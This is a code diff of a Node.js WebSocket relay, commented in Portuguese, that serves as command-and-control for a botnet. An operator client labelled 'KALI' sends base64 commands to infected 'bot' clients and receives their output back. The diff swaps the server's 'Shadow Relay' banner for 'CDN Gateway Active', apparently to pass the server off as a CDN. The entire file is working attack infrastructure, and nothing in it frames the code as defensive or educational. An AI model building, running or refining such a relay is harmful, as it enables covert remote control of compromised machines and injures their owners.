@@ -1,59 +1,47 @@
 const WebSocket = require('ws');
 const http = require('http');
 
-const PORT = process.env.PORT || 10000;
-const server = http.createServer((_, r) => r.end('Shadow Relay v3 High-Stability'));
+const server = http.createServer((_, r) => r.end('CDN Gateway Active'));
 const wss = new WebSocket.Server({ server });
 
-const OPERADORES = new Set();
+let KALI = null;
 const BOTS = new Map();
 
 wss.on('connection', (ws, req) => {
-    // Captura o IP real (considerando se estiver atrás de um proxy como o Render)
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const params = new URLSearchParams(req.url.split('?')[1]);
-    const who = params.get('id');
+    const id = new URLSearchParams(req.url.split('?')[1]).get('id');
+    if (!id) return ws.close();
 
-    if (!who) return ws.close();
-
-    if (who === 'KALI') {
-        OPERADORES.add(ws);
-        BOTS.forEach((info, id) => {
-            ws.send(JSON.stringify({ t: 'bot', s: 'on', id: id, ip: info.ip }));
+    if (id === 'KALI') {
+        KALI = ws;
+        // Ao conectar, pede a lista de todos os bots
+        BOTS.forEach((_, botId) => {
+            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId }));
         });
     } else {
-        // Armazena o socket e o IP do alvo
-        BOTS.set(who, { socket: ws, ip: ip });
-        const msg = JSON.stringify({ t: 'bot', s: 'on', id: who, ip: ip });
-        OPERADORES.forEach(op => { if (op.readyState === WebSocket.OPEN) op.send(msg); });
+        BOTS.set(id, ws);
+        if (KALI) KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
     }
 
-    ws.on('message', (data) => {
-        try {
-            const j = JSON.parse(data);
-            if (OPERADORES.has(ws)) {
-                // KALI mandando para o BOT
-                const target = BOTS.get(j.to);
-                if (target && target.socket.readyState === WebSocket.OPEN) {
-                    target.socket.send(j.cmd); // Envia o comando (que já deve vir em B64 do Kali)
-                }
-            } else {
-                // BOT mandando resposta para o KALI
-                const msg = JSON.stringify({ t: 'res', f: who, d: j.out });
-                OPERADORES.forEach(op => { if (op.readyState === WebSocket.OPEN) op.send(msg); });
+    ws.on('message', (raw) => {
+        if (ws === KALI) {
+            // KALI envia: {"to": "ID_DO_BOT", "cmd": "BASE64_DO_COMANDO"}
+            try {
+                const data = JSON.parse(raw);
+                const target = BOTS.get(data.to);
+                if (target) target.send(data.cmd); 
+            } catch (e) {}
+        } else {
+            // BOT envia resposta pura -> Encaminha para o KALI
+            if (KALI && KALI.readyState === WebSocket.OPEN) {
+                KALI.send(JSON.stringify({ t: 'res', f: id, d: raw.toString() }));
             }
-        } catch (e) { }
+        }
     });
 
     ws.on('close', () => {
-        if (OPERADORES.has(ws)) {
-            OPERADORES.delete(ws);
-        } else {
-            BOTS.delete(who);
-            const msg = JSON.stringify({ t: 'bot', s: 'off', id: who });
-            OPERADORES.forEach(op => { if (op.readyState === WebSocket.OPEN) op.send(msg); });
-        }
+        if (ws === KALI) KALI = null;
+        else BOTS.delete(id);
     });
 });
 
-server.listen(PORT);
+server.listen(process.env.PORT || 10000);
